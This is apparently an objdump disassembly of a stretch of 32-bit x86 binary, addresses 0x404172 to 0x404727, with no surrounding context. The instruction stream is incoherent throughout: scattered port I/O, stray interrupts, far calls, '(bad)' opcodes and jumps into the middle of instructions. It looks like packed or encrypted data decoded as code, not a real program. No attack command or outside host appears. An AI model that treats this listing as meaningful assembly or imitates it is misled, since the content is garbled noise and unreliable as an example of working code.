  404172:	93                   	xchg   %eax,%ebx
  404173:	6e                   	outsb  %ds:(%esi),(%dx)
  404174:	89 b3 85 62 d5 e4    	mov    %esi,-0x1b2a9d7b(%ebx)
  40417a:	b6 c4                	mov    $0xc4,%dh
  40417c:	36 7b 9b             	ss jnp 0x40411a
  40417f:	2d 2c ce 16 6e       	sub    $0x6e16ce2c,%eax
  404184:	b0 e7                	mov    $0xe7,%al
  404186:	cd 30                	int    $0x30
  404188:	24 e4                	and    $0xe4,%al
  40418a:	85 fb                	test   %edi,%ebx
  40418c:	8e c5                	mov    %ebp,%es
  40418e:	97                   	xchg   %eax,%edi
  40418f:	65 bf 13 c7 fb 04    	gs mov $0x4fbc713,%edi
  404195:	83 bd 68 06 9d 63 f7 	cmpl   $0xfffffff7,0x639d0668(%ebp)
  40419c:	bb d0 b7 99 72       	mov    $0x7299b7d0,%ebx
  4041a1:	a3 c8 4d 8b 16       	mov    %eax,0x168b4dc8
  4041a6:	be 72 de 02 4b       	mov    $0x4b02de72,%esi
  4041ab:	1c 35                	sbb    $0x35,%al
  4041ad:	98                   	cwtl
  4041ae:	63 b6 86 ad 7c d5    	arpl   %esi,-0x2a83527a(%esi)
  4041b4:	88 59 9a             	mov    %bl,-0x66(%ecx)
  4041b7:	f7 2b                	imull  (%ebx)
  4041b9:	66 7b 2b             	data16 jnp 0x4041e7
  4041bc:	f5                   	cmc
  4041bd:	87 39                	xchg   %edi,(%ecx)
  4041bf:	be 95 7a c4 16       	mov    $0x16c47a95,%esi
  4041c4:	5a                   	pop    %edx
  4041c5:	f2 1b 2c 0a          	repnz sbb (%edx,%ecx,1),%ebp
  4041c9:	b1 b7                	mov    $0xb7,%cl
  4041cb:	db 8b 8e 33 e3 65    	fisttpl 0x65e3338e(%ebx)
  4041d1:	ed                   	in     (%dx),%eax
  4041d2:	1d 05 25 16 b3       	sbb    $0xb3162505,%eax
  4041d7:	39 a9 a3 ad 20 9f    	cmp    %ebp,-0x60df525d(%ecx)
  4041dd:	ff c2                	inc    %edx
  4041df:	30 54 44 1b          	xor    %dl,0x1b(%esp,%eax,2)
  4041e3:	62 0d 31 f0 5f db    	bound  %ecx,0xdb5ff031
  4041e9:	a9 5a f6 62 9e       	test   $0x9e62f65a,%eax
  4041ee:	73 9c                	jae    0x40418c
  4041f0:	35 24 8d 87 9a       	xor    $0x9a878d24,%eax
  4041f5:	bd 19 2f 69 0d       	mov    $0xd692f19,%ebp
  4041fa:	c9                   	leave
  4041fb:	b1 1a                	mov    $0x1a,%cl
  4041fd:	43                   	inc    %ebx
  4041fe:	43                   	inc    %ebx
  4041ff:	ec                   	in     (%dx),%al
  404200:	9d                   	popf
  404201:	94                   	xchg   %eax,%esp
  404202:	af                   	scas   %es:(%edi),%eax
  404203:	53                   	push   %ebx
  404204:	ed                   	in     (%dx),%eax
  404205:	0d 4b a4 25 b1       	or     $0xb125a44b,%eax
  40420a:	55                   	push   %ebp
  40420b:	f4                   	hlt
  40420c:	80 c1 5e             	add    $0x5e,%cl
  40420f:	fa                   	cli
  404210:	2f                   	das
  404211:	fe 0b                	decb   (%ebx)
  404213:	d0 d0                	rcl    $1,%al
  404215:	b4 88                	mov    $0x88,%ah
  404217:	0e                   	push   %cs
  404218:	6b a8 2b fd c8 0c 80 	imul   $0xffffff80,0xcc8fd2b(%eax),%ebp
  40421f:	76 5b                	jbe    0x40427c
  404221:	84 d5                	test   %dl,%ch
  404223:	64 8d 88 cb ee e0 41 	lea    %fs:0x41e0eecb(%eax),%ecx
  40422a:	47                   	inc    %edi
  40422b:	5a                   	pop    %edx
  40422c:	cd d6                	int    $0xd6
  40422e:	88 8b b0 cc 16 c5    	mov    %cl,-0x3ae93350(%ebx)
  404234:	2d 6b e8 d5 54       	sub    $0x54d5e86b,%eax
  404239:	68 ce ee e4 ed       	push   $0xede4eece
  40423e:	47                   	inc    %edi
  40423f:	2d db c3 4f b7       	sub    $0xb74fc3db,%eax
  404244:	58                   	pop    %eax
  404245:	23 f6                	and    %esi,%esi
  404247:	2f                   	das
  404248:	e5 bf                	in     $0xbf,%eax
  40424a:	33 35 5b 23 db e2    	xor    0xe2db235b,%esi
  404250:	f3 37                	repz aaa
  404252:	e1 c1                	loope  0x404215
  404254:	de 5a ea             	ficomps -0x16(%edx)
  404257:	e2 45                	loop   0x40429e
  404259:	e1 09                	loope  0x404264
  40425b:	ab                   	stos   %eax,%es:(%edi)
  40425c:	db 78 41             	fstpt  0x41(%eax)
  40425f:	c2 aa 46             	ret    $0x46aa
  404262:	26 d2 4d 68          	rorb   %cl,%es:0x68(%ebp)
  404266:	db 5f 5a             	fistpl 0x5a(%edi)
  404269:	21 9d 78 74 4a a4    	and    %ebx,-0x5bb58b88(%ebp)
  40426f:	63 47 27             	arpl   %eax,0x27(%edi)
  404272:	97                   	xchg   %eax,%edi
  404273:	69 bd 52 9a 1a ac 86 	imul   $0x15ee0e86,-0x53e565ae(%ebp),%edi
  40427a:	0e ee 15 
  40427d:	20 98 4b 84 62 8d    	and    %bl,-0x729d7bb5(%eax)
  404283:	4c                   	dec    %esp
  404284:	68 e5 ad b5 ee       	push   $0xeeb5ade5
  404289:	cf                   	iret
  40428a:	9b                   	fwait
  40428b:	6b b7 46 24 62 c7 cd 	imul   $0xffffffcd,-0x389ddbba(%edi),%esi
  404292:	b0 1a                	mov    $0x1a,%al
  404294:	2d d6 19 2f 1d       	sub    $0x1d2f19d6,%eax
  404299:	c0 83 bd d5 3a 23 b5 	rolb   $0xb5,0x233ad5bd(%ebx)
  4042a0:	e3 a5                	jecxz  0x404247
  4042a2:	03 58 1e             	add    0x1e(%eax),%ebx
  4042a5:	66 89 6f 0d          	mov    %bp,0xd(%edi)
  4042a9:	2f                   	das
  4042aa:	b9 87 ff be cb       	mov    $0xcbbeff87,%ecx
  4042af:	c6                   	(bad)
  4042b0:	7f 91                	jg     0x404243
  4042b2:	9a d8 66 6e b3 b7 da 	lcall  $0xdab7,$0xb36e66d8
  4042b9:	db d2                	fcmovnbe %st(2),%st
  4042bb:	71 cb                	jno    0x404288
  4042bd:	08 f9                	or     %bh,%cl
  4042bf:	91                   	xchg   %eax,%ecx
  4042c0:	3a 25 d7 44 9a cd    	cmp    0xcd9a44d7,%ah
  4042c6:	6a 4e                	push   $0x4e
  4042c8:	6c                   	insb   (%dx),%es:(%edi)
  4042c9:	0d c3 0b 98 5b       	or     $0x5b980bc3,%eax
  4042ce:	ad                   	lods   %ds:(%esi),%eax
  4042cf:	d1 6d 78             	shrl   $1,0x78(%ebp)
  4042d2:	8d                   	lea    (bad),%edi
  4042d3:	fd                   	std
  4042d4:	45                   	inc    %ebp
  4042d5:	85 18                	test   %ebx,(%eax)
  4042d7:	ce                   	into
  4042d8:	44                   	inc    %esp
  4042d9:	25 9d 2b b9 46       	and    $0x46b92b9d,%eax
  4042de:	a9 a3 dc 4a 7a       	test   $0x7a4adca3,%eax
  4042e3:	08 37                	or     %dh,(%edi)
  4042e5:	ad                   	lods   %ds:(%esi),%eax
  4042e6:	d6                   	salc
  4042e7:	c2 f7 f8             	ret    $0xf8f7
  4042ea:	d1 16                	rcll   $1,(%esi)
  4042ec:	c3                   	ret
  4042ed:	03 c3                	add    %ebx,%eax
  4042ef:	0e                   	push   %cs
  4042f0:	8d 49 8b             	lea    -0x75(%ecx),%ecx
  4042f3:	59                   	pop    %ecx
  4042f4:	98                   	cwtl
  4042f5:	81 dd 17 13 df e6    	sbb    $0xe6df1317,%ebp
  4042fb:	b4 d9                	mov    $0xd9,%ah
  4042fd:	78 98                	js     0x404297
  4042ff:	36 19 a6 8d 87 c9 43 	sbb    %esp,%ss:0x43c9878d(%esi)
  404306:	cc                   	int3
  404307:	8d                   	lea    (bad),%esp
  404308:	e5 3a                	in     $0x3a,%eax
  40430a:	af                   	scas   %es:(%edi),%eax
  40430b:	8b 93 20 41 1d ab    	mov    -0x54e2bee0(%ebx),%edx
  404311:	84 d6                	test   %dl,%dh
  404313:	f0 a9 a7 08 4e c1    	lock test $0xc14e08a7,%eax
  404319:	92                   	xchg   %eax,%edx
  40431a:	4b                   	dec    %ebx
  40431b:	f9                   	stc
  40431c:	ef                   	out    %eax,(%dx)
  40431d:	9d                   	popf
  40431e:	c3                   	ret
  40431f:	ed                   	in     (%dx),%eax
  404320:	ad                   	lods   %ds:(%esi),%eax
  404321:	b6 70                	mov    $0x70,%dh
  404323:	3e 02 76 de          	add    %ds:-0x22(%esi),%dh
  404327:	1e                   	push   %ds
  404328:	56                   	push   %esi
  404329:	3e 80 7d 14 c1       	cmpb   $0xc1,%ds:0x14(%ebp)
  40432e:	c3                   	ret
  40432f:	e2 bf                	loop   0x4042f0
  404331:	22 b5 86 a6 76 a4    	and    -0x5b89597a(%ebp),%dh
  404337:	f3 af                	repz scas %es:(%edi),%eax
  404339:	72 b4                	jb     0x4042ef
  40433b:	eb a7                	jmp    0x4042e4
  40433d:	d7                   	xlat   %ds:(%ebx)
  40433e:	71 ca                	jno    0x40430a
  404340:	8f                   	(bad)
  404341:	cd bc                	int    $0xbc
  404343:	69 75 4f e2 0f e6 4b 	imul   $0x4be60fe2,0x4f(%ebp),%esi
  40434a:	12 5e 3e             	adc    0x3e(%esi),%bl
  40434d:	69 bf 2d 21 ce 16 17 	imul   $0x8d8b6717,0x16ce212d(%edi),%edi
  404354:	67 8b 8d 
  404357:	b3 d9                	mov    $0xd9,%bl
  404359:	73 77                	jae    0x4043d2
  40435b:	e1 24                	loope  0x404381
  40435d:	49                   	dec    %ecx
  40435e:	b2 da                	mov    $0xda,%dl
  404360:	d5 29                	aad    $0x29
  404362:	34 d3                	xor    $0xd3,%al
  404364:	1a fa                	sbb    %dl,%bh
  404366:	92                   	xchg   %eax,%edx
  404367:	62 9d b9 bf e8 18    	bound  %ebx,0x18e8bfb9(%ebp)
  40436d:	1e                   	push   %ds
  40436e:	0d 37 f1 b2 45       	or     $0x45b2f137,%eax
  404373:	f5                   	cmc
  404374:	d8 48 34             	fmuls  0x34(%eax)
  404377:	79 78                	jns    0x4043f1
  404379:	f1                   	int1
  40437a:	22 87 75 26 4e 85    	and    -0x7ab1d98b(%edi),%al
  404380:	85 cb                	test   %ecx,%ebx
  404382:	12 6c f1 b9          	adc    -0x47(%ecx,%esi,8),%ch
  404386:	66 6b 3c e6 14       	imul   $0x14,(%esi,%eiz,8),%di
  40438b:	8f                   	(bad)
  40438c:	25 d6 78 de a7       	and    $0xa7de78d6,%eax
  404391:	9c                   	pushf
  404392:	45                   	inc    %ebp
  404393:	48                   	dec    %eax
  404394:	6b 62 e1 bb          	imul   $0xffffffbb,-0x1f(%edx),%esp
  404398:	c8 b8 fc 08          	enter  $0xfcb8,$0x8
  40439c:	ce                   	into
  40439d:	a2 28 2c 8f 2d       	mov    %al,0x2d8f2c28
  4043a2:	08 b1 ce b4 c5 5a    	or     %dh,0x5ac5b4ce(%ecx)
  4043a8:	e3 6d                	jecxz  0x404417
  4043aa:	71 56                	jno    0x404402
  4043ac:	3b 9e 64 b7 da d3    	cmp    -0x2c25489c(%esi),%ebx
  4043b2:	a2 17 86 5a 13       	mov    %al,0x135a8617
  4043b7:	ac                   	lods   %ds:(%esi),%al
  4043b8:	f6 95 bb 8f 1c 39    	notb   0x391c8fbb(%ebp)
  4043be:	62 8d c5 ab f3 50    	bound  %ecx,0x50f3abc5(%ebp)
  4043c4:	12 d2                	adc    %dl,%dl
  4043c6:	66 b4 8b             	data16 mov $0x8b,%ah
  4043c9:	39 9b 60 6f 7d c9    	cmp    %ebx,-0x368290a0(%ebx)
  4043cf:	96                   	xchg   %eax,%esi
  4043d0:	c0 43 b6 26          	rolb   $0x26,-0x4a(%ebx)
  4043d4:	1c b0                	sbb    $0xb0,%al
  4043d6:	c6                   	(bad)
  4043d7:	25 ac 5e 49 13       	and    $0x13495eac,%eax
  4043dc:	77 26                	ja     0x404404
  4043de:	26 8c 8f cb 15 0b 85 	mov    %cs,%es:-0x7af4ea35(%edi)
  4043e5:	67 4b                	addr16 dec %ebx
  4043e7:	b6 db                	mov    $0xdb,%dh
  4043e9:	52                   	push   %edx
  4043ea:	72 8f                	jb     0x40437b
  4043ec:	c3                   	ret
  4043ed:	cb                   	lret
  4043ee:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4043ef:	50                   	push   %eax
  4043f0:	10 29                	adc    %ch,(%ecx)
  4043f2:	ad                   	lods   %ds:(%esi),%eax
  4043f3:	b2 b3                	mov    $0xb3,%dl
  4043f5:	d0 0c f6             	rorb   $1,(%esi,%esi,8)
  4043f8:	d7                   	xlat   %ds:(%ebx)
  4043f9:	54                   	push   %esp
  4043fa:	3d 21 16 23 5b       	cmp    $0x5b231621,%eax
  4043ff:	aa                   	stos   %al,%es:(%edi)
  404400:	35 15 2f d5 68       	xor    $0x68d52f15,%eax
  404405:	4d                   	dec    %ebp
  404406:	c5 ab 05 63 c0 93    	lds    -0x6c3f9cfb(%ebx),%ebp
  40440c:	d5 30                	aad    $0x30
  40440e:	52                   	push   %edx
  40440f:	30 dc                	xor    %bl,%ah
  404411:	14 6b                	adc    $0x6b,%al
  404413:	8a 35 ae f0 80 d9    	mov    0xd980f0ae,%dh
  404419:	1a d7                	sbb    %bh,%dl
  40441b:	1a a6 cd 6c 8c a9    	sbb    -0x56739333(%esi),%ah
  404421:	28 d9                	sub    %bl,%cl
  404423:	9a 9c b6 3a 3f 8e 4f 	lcall  $0x4f8e,$0x3f3ab69c
  40442a:	88 e4                	mov    %ah,%ah
  40442c:	f8                   	clc
  40442d:	cd 76                	int    $0x76
  40442f:	75 32                	jne    0x404463
  404431:	e0 78                	loopne 0x4044ab
  404433:	96                   	xchg   %eax,%esi
  404434:	9c                   	pushf
  404435:	0d 7c 0d 4b 28       	or     $0x284b0d7c,%eax
  40443a:	4a                   	dec    %edx
  40443b:	b5 26                	mov    $0x26,%ch
  40443d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40443e:	1f                   	pop    %ds
  40443f:	59                   	pop    %ecx
  404440:	8d 03                	lea    (%ebx),%eax
  404442:	14 2b                	adc    $0x2b,%al
  404444:	eb 38                	jmp    0x40447e
  404446:	e3 d5                	jecxz  0x40441d
  404448:	5a                   	pop    %edx
  404449:	7c 26                	jl     0x404471
  40444b:	6d                   	insl   (%dx),%es:(%edi)
  40444c:	b5 c6                	mov    $0xc6,%ch
  40444e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40444f:	c5 e4 cf             	(bad)
  404452:	e6 75                	out    %al,$0x75
  404454:	0c 58                	or     $0x58,%al
  404456:	27                   	daa
  404457:	99                   	cltd
  404458:	d7                   	xlat   %ds:(%ebx)
  404459:	89 4b 68             	mov    %ecx,0x68(%ebx)
  40445c:	8b df                	mov    %edi,%ebx
  40445e:	6c                   	insb   (%dx),%es:(%edi)
  40445f:	4d                   	dec    %ebp
  404460:	4e                   	dec    %esi
  404461:	de ec                	fsubrp %st,%st(4)
  404463:	8c d7                	mov    %ss,%edi
  404465:	57                   	push   %edi
  404466:	5d                   	pop    %ebp
  404467:	89 55 33             	mov    %edx,0x33(%ebp)
  40446a:	44                   	inc    %esp
  40446b:	8d 78 aa             	lea    -0x56(%eax),%edi
  40446e:	91                   	xchg   %eax,%ecx
  40446f:	82 b3 4f 37 ff 72 93 	xorb   $0x93,0x72ff374f(%ebx)
  404476:	c4                   	(bad)
  404477:	d9 29                	fldcw  (%ecx)
  404479:	58                   	pop    %eax
  40447a:	96                   	xchg   %eax,%esi
  40447b:	36 83 17 8a          	adcl   $0xffffff8a,%ss:(%edi)
  40447f:	85 04 97             	test   %eax,(%edi,%edx,4)
  404482:	11 9c 86 b9 b6 29 e6 	adc    %ebx,-0x19d64947(%esi,%eax,4)
  404489:	1d ae 6f ab 96       	sbb    $0x96ab6fae,%eax
  40448e:	7f 73                	jg     0x404503
  404490:	e4 48                	in     $0x48,%al
  404492:	ee                   	out    %al,(%dx)
  404493:	12 5a c6             	adc    -0x3a(%edx),%bl
  404496:	52                   	push   %edx
  404497:	ff f3                	push   %ebx
  404499:	32 24 1a             	xor    (%edx,%ebx,1),%ah
  40449c:	90                   	nop
  40449d:	27                   	daa
  40449e:	53                   	push   %ebx
  40449f:	43                   	inc    %ebx
  4044a0:	7c dd                	jl     0x40447f
  4044a2:	6b 2b 18             	imul   $0x18,(%ebx),%ebp
  4044a5:	cb                   	lret
  4044a6:	35 72 8f 1a f9       	xor    $0xf91a8f72,%eax
  4044ab:	62 72 23             	bound  %esi,0x23(%edx)
  4044ae:	56                   	push   %esi
  4044af:	a3 c1 8e 15 2d       	mov    %eax,0x2d158ec1
  4044b4:	b4 f6                	mov    $0xf6,%ah
  4044b6:	59                   	pop    %ecx
  4044b7:	e4 aa                	in     $0xaa,%al
  4044b9:	68 b4 86 58 b2       	push   $0xb25886b4
  4044be:	dd ea                	fucomp %st(2)
  4044c0:	fa                   	cli
  4044c1:	47                   	inc    %edi
  4044c2:	bf 3b 4f c2 53       	mov    $0x53c24f3b,%edi
  4044c7:	22 69 ed             	and    -0x13(%ecx),%ch
  4044ca:	cf                   	iret
  4044cb:	8d 51 0c             	lea    0xc(%ecx),%edx
  4044ce:	e6 56                	out    %al,$0x56
  4044d0:	a3 39 75 53 5a       	mov    %eax,0x5a537539
  4044d5:	5a                   	pop    %edx
  4044d6:	3b 5f 1e             	cmp    0x1e(%edi),%ebx
  4044d9:	f0 92                	lock xchg %eax,%edx
  4044db:	66 53                	push   %bx
  4044dd:	e1 df                	loope  0x4044be
  4044df:	d4 7a                	aam    $0x7a
  4044e1:	b7 63                	mov    $0x63,%bh
  4044e3:	67 45                	addr16 inc %ebp
  4044e5:	d1 e7                	shl    $1,%edi
  4044e7:	b2 45                	mov    $0x45,%dl
  4044e9:	d8 5e b8             	fcomps -0x48(%esi)
  4044ec:	fa                   	cli
  4044ed:	d0 8a 88 8b b4 db    	rorb   $1,-0x244b7478(%edx)
  4044f3:	8c a2 71 d3 8f 3d    	mov    %fs,0x3d8fd371(%edx)
  4044f9:	20 2c e2             	and    %ch,(%edx,%eiz,8)
  4044fc:	d9 10                	fsts   (%eax)
  4044fe:	12 4b f7             	adc    -0x9(%ebx),%cl
  404501:	26 7f 48             	es jg  0x40454c
  404504:	76 24                	jbe    0x40452a
  404506:	b4 87                	mov    $0x87,%ah
  404508:	99                   	cltd
  404509:	f1                   	int1
  40450a:	31 61 9e             	xor    %esp,-0x62(%ecx)
  40450d:	f8                   	clc
  40450e:	98                   	cwtl
  40450f:	c0 22 cc             	shlb   $0xcc,(%edx)
  404512:	26 2f                	es das
  404514:	49                   	dec    %ecx
  404515:	b4 18                	mov    $0x18,%ah
  404517:	a1 a8 97 c1 45       	mov    0x45c197a8,%eax
  40451c:	d5 a2                	aad    $0xa2
  40451e:	2e da 11             	ficoml %cs:(%ecx)
  404521:	b8 68 db 8b 3a       	mov    $0x3a8bdb68,%eax
  404526:	94                   	xchg   %eax,%esp
  404527:	90                   	nop
  404528:	fd                   	std
  404529:	4a                   	dec    %edx
  40452a:	88 98 73 21 62 c2    	mov    %bl,-0x3d9dde8d(%eax)
  404530:	29 21                	sub    %esp,(%ecx)
  404532:	b8 dc f1 c7 a5       	mov    $0xa5c7f1dc,%eax
  404537:	cd 18                	int    $0x18
  404539:	92                   	xchg   %eax,%edx
  40453a:	d8 1a                	fcomps (%edx)
  40453c:	11 6a 0d             	adc    %ebp,0xd(%edx)
  40453f:	c9                   	leave
  404540:	5f                   	pop    %edi
  404541:	6e                   	outsb  %ds:(%esi),(%dx)
  404542:	b6 e3                	mov    $0xe3,%dh
  404544:	43                   	inc    %ebx
  404545:	75 8a                	jne    0x4044d1
  404547:	ba 38 32 69 ff       	mov    $0xff693238,%edx
  40454c:	b9 8d 70 bc 4e       	mov    $0x4ebc708d,%ecx
  404551:	bb bd f4 6d be       	mov    $0xbe6df4bd,%ebx
  404556:	4e                   	dec    %esi
  404557:	1b ed                	sbb    %ebp,%ebp
  404559:	9d                   	popf
  40455a:	36 5c                	ss pop %esp
  40455c:	cc                   	int3
  40455d:	8a 56 58             	mov    0x58(%esi),%dl
  404560:	c3                   	ret
  404561:	13 3b                	adc    (%ebx),%edi
  404563:	c4 6c 0e c3          	les    -0x3d(%esi,%ecx,1),%ebp
  404567:	15 3f ec 22 5c       	adc    $0x5c22ec3f,%eax
  40456c:	f8                   	clc
  40456d:	c3                   	ret
  40456e:	71 e6                	jno    0x404556
  404570:	ce                   	into
  404571:	8f                   	(bad)
  404572:	a1 43 7c ab 2d       	mov    0x2dab7c43,%eax
  404577:	12 5b 8a             	adc    -0x76(%ebx),%bl
  40457a:	28 b9 9d 3f a3 79    	sub    %bh,0x79a33f9d(%ecx)
  404580:	9b                   	fwait
  404581:	e8 27 a0 3f 0c       	call   0xc7fe5ad
  404586:	b4 da                	mov    $0xda,%ah
  404588:	b7 2f                	mov    $0x2f,%bh
  40458a:	88 b5 86 d3 32 d1    	mov    %dh,-0x2ecd2c7a(%ebp)
  404590:	1e                   	push   %ds
  404591:	df 69 9b             	fildll -0x65(%ecx)
  404594:	91                   	xchg   %eax,%ecx
  404595:	80 a5 f6 d6 88 dc 3d 	andb   $0x3d,-0x2377290a(%ebp)
  40459c:	d6                   	salc
  40459d:	f0 78 51             	lock js 0x4045f1
  4045a0:	74 44                	je     0x4045e6
  4045a2:	57                   	push   %edi
  4045a3:	84 0d e5 ba 70 09    	test   %cl,0x970bae5
  4045a9:	6b 5f 90 22          	imul   $0x22,-0x70(%edi),%ebx
  4045ad:	8b 92 b1 08 2b 77    	mov    0x772b08b1(%edx),%edx
  4045b3:	e2 b5                	loop   0x40456a
  4045b5:	12 c4                	adc    %ah,%al
  4045b7:	b5 72                	mov    $0x72,%ch
  4045b9:	57                   	push   %edi
  4045ba:	e1 a5                	loope  0x404561
  4045bc:	4f                   	dec    %edi
  4045bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4045be:	4f                   	dec    %edi
  4045bf:	c8 c3 4a 29          	enter  $0x4ac3,$0x29
  4045c3:	9d                   	popf
  4045c4:	74 9b                	je     0x404561
  4045c6:	b6 8b                	mov    $0x8b,%dh
  4045c8:	4a                   	dec    %edx
  4045c9:	69 6a 40 18 40 6e 02 	imul   $0x26e4018,0x40(%edx),%ebp
  4045d0:	8f                   	(bad)
  4045d1:	8f                   	(bad)
  4045d2:	4e                   	dec    %esi
  4045d3:	e6 75                	out    %al,$0x75
  4045d5:	78 00                	js     0x4045d7
  4045d7:	74 3e                	je     0x404617
  4045d9:	ef                   	out    %eax,(%dx)
  4045da:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4045db:	6d                   	insl   (%dx),%es:(%edi)
  4045dc:	d6                   	salc
  4045dd:	19 bd 6d 3d 98 88    	sbb    %edi,-0x7767c293(%ebp)
  4045e3:	29 14 ef             	sub    %edx,(%edi,%ebp,8)
  4045e6:	c4 a8 fd 07 d0 c0    	les    -0x3f2ff803(%eax),%ebp
  4045ec:	95                   	xchg   %eax,%ebp
  4045ed:	17                   	pop    %ss
  4045ee:	4d                   	dec    %ebp
  4045ef:	ec                   	in     (%dx),%al
  4045f0:	1b ee                	sbb    %esi,%ebp
  4045f2:	c4 93 83 c9 1c 48    	les    0x481cc983(%ebx),%edx
  4045f8:	b0 45                	mov    $0x45,%al
  4045fa:	e7 c6                	out    %eax,$0xc6
  4045fc:	f3 7a d1             	repz jp 0x4045d0
  4045ff:	24 f5                	and    $0xf5,%al
  404601:	5a                   	pop    %edx
  404602:	a3 b7 b5 1e c2       	mov    %eax,0xc21eb5b7
  404607:	3a d1                	cmp    %cl,%dl
  404609:	78 bb                	js     0x4045c6
  40460b:	46                   	inc    %esi
  40460c:	a3 63 8d ec 2d       	mov    %eax,0x2dec8d63
  404611:	1c 0f                	sbb    $0xf,%al
  404613:	b5 46                	mov    $0x46,%ch
  404615:	b6 46                	mov    $0x46,%dh
  404617:	9a ed a5 01 9e b3 c9 	lcall  $0xc9b3,$0x9e01a5ed
  40461e:	8a 6d ed             	mov    -0x13(%ebp),%ch
  404621:	e7 87                	out    %eax,$0x87
  404623:	78 ea                	js     0x40460f
  404625:	68 6e 25 04 87       	push   $0x8704256e
  40462a:	60                   	pusha
  40462b:	25 2f c5 75 22       	and    $0x2275c52f,%eax
  404630:	3c 2d                	cmp    $0x2d,%al
  404632:	a2 d3 1a ee d2       	mov    %al,0xd2ee1ad3
  404637:	f7 2c 7f             	imull  (%edi,%edi,2)
  40463a:	96                   	xchg   %eax,%esi
  40463b:	5a                   	pop    %edx
  40463c:	ac                   	lods   %ds:(%esi),%al
  40463d:	61                   	popa
  40463e:	b8 6e 87 a7 76       	mov    $0x76a7876e,%eax
  404643:	aa                   	stos   %al,%es:(%edi)
  404644:	c9                   	leave
  404645:	f7 6a 27             	imull  0x27(%edx)
  404648:	6f                   	outsl  %ds:(%esi),(%dx)
  404649:	73 f6                	jae    0x404641
  40464b:	e0 00                	loopne 0x40464d
  40464d:	85 6e 0b             	test   %ebp,0xb(%esi)
  404650:	e5 97                	in     $0x97,%eax
  404652:	6c                   	insb   (%dx),%es:(%edi)
  404653:	2b bc ff 67 0e 71 28 	sub    0x28710e67(%edi,%edi,8),%edi
  40465a:	ce                   	into
  40465b:	c9                   	leave
  40465c:	d0 92 9b bf 3b 72    	rclb   $1,0x723bbf9b(%edx)
  404662:	04 27                	add    $0x27,%al
  404664:	cb                   	lret
  404665:	ca df 51             	lret   $0x51df
  404668:	c0 a1 78 ce 01 fe dd 	shlb   $0xdd,-0x1fe3188(%ecx)
  40466f:	0d 3e 34 c1 91       	or     $0x91c1343e,%eax
  404674:	77 e7                	ja     0x40465d
  404676:	ae                   	scas   %es:(%edi),%al
  404677:	16                   	push   %ss
  404678:	b1 62                	mov    $0x62,%cl
  40467a:	0c fb                	or     $0xfb,%al
  40467c:	45                   	inc    %ebp
  40467d:	5a                   	pop    %edx
  40467e:	22 1f                	and    (%edi),%bl
  404680:	79 3d                	jns    0x4046bf
  404682:	ab                   	stos   %eax,%es:(%edi)
  404683:	d5 ca                	aad    $0xca
  404685:	d7                   	xlat   %ds:(%ebx)
  404686:	3b eb                	cmp    %ebx,%ebp
  404688:	8f                   	(bad)
  404689:	e4 11                	in     $0x11,%al
  40468b:	1a 9a d0 56 f8 a0    	sbb    -0x5f07a930(%edx),%bl
  404691:	2e 1d 19 11 25 53    	cs sbb $0x53251119,%eax
  404697:	32 1b                	xor    (%ebx),%bl
  404699:	a3 98 b2 50 c6       	mov    %eax,0xc650b298
  40469e:	ab                   	stos   %eax,%es:(%edi)
  40469f:	56                   	push   %esi
  4046a0:	fb                   	sti
  4046a1:	fe                   	(bad)
  4046a2:	5b                   	pop    %ebx
  4046a3:	ac                   	lods   %ds:(%esi),%al
  4046a4:	86 77 40             	xchg   %dh,0x40(%edi)
  4046a7:	38 1f                	cmp    %bl,(%edi)
  4046a9:	3b ba db 6d c6 29    	cmp    0x29c66ddb(%edx),%edi
  4046af:	83 0e b5             	orl    $0xffffffb5,(%esi)
  4046b2:	e0 0a                	loopne 0x4046be
  4046b4:	f1                   	int1
  4046b5:	b2 d5                	mov    $0xd5,%dl
  4046b7:	c4 37                	les    (%edi),%esi
  4046b9:	a9 9b e5 26 75       	test   $0x7526e59b,%eax
  4046be:	b3 d8                	mov    $0xd8,%bl
  4046c0:	b5 76                	mov    $0x76,%ch
  4046c2:	48                   	dec    %eax
  4046c3:	a1 43 08 9d 52       	mov    0x529d0843,%eax
  4046c8:	e8 14 82 5b 0a       	call   0xa9bc8e1
  4046cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4046ce:	21 74 49 a1          	and    %esi,-0x5f(%ecx,%ecx,2)
  4046d2:	4b                   	dec    %ebx
  4046d3:	08 5b a4             	or     %bl,-0x5c(%ebx)
  4046d6:	b0 45                	mov    $0x45,%al
  4046d8:	08 5b a5             	or     %bl,-0x5b(%ebx)
  4046db:	40                   	inc    %eax
  4046dc:	06                   	push   %es
  4046dd:	7d 8f                	jge    0x40466e
  4046df:	86 7f 6f             	xchg   %bh,0x6f(%edi)
  4046e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4046e3:	06                   	push   %es
  4046e4:	ff 5e c5             	lcall  *-0x3b(%esi)
  4046e7:	7a bc                	jp     0x4046a5
  4046e9:	89 c3                	mov    %eax,%ebx
  4046eb:	cc                   	int3
  4046ec:	51                   	push   %ecx
  4046ed:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4046ee:	c1 53 f9 a6          	rcll   $0xa6,-0x7(%ebx)
  4046f2:	5f                   	pop    %edi
  4046f3:	7e d3                	jle    0x4046c8
  4046f5:	69 99 ba d5 5f a5 6e 	imul   $0x8857f56e,-0x5aa02a46(%ecx),%ebx
  4046fc:	f5 57 88 
  4046ff:	ad                   	lods   %ds:(%esi),%eax
  404700:	7e a9                	jle    0x4046ab
  404702:	78 1f                	js     0x404723
  404704:	58                   	pop    %eax
  404705:	c3                   	ret
  404706:	8f                   	(bad)
  404707:	e6 13                	out    %al,$0x13
  404709:	f9                   	stc
  40470a:	19 d9                	sbb    %ebx,%ecx
  40470c:	e5 fc                	in     $0xfc,%eax
  40470e:	0b 17                	or     (%edi),%edx
  404710:	5d                   	pop    %ebp
  404711:	fc                   	cld
  404712:	1b 26                	sbb    (%esi),%esp
  404714:	df 9b 1b f9 d7 26    	fistps 0x26d7f91b(%ebx)
  40471a:	b6 f0                	mov    $0xf0,%dh
  40471c:	5f                   	pop    %edi
  40471d:	be e0 bd 99 3b       	mov    $0x3b99bde0,%esi
  404722:	3f                   	aas
  404723:	0e                   	push   %cs
  404724:	d7                   	xlat   %ds:(%ebx)
  404725:	88 32                	mov    %dh,(%edx)
  404727:	5e                   	pop    %esi
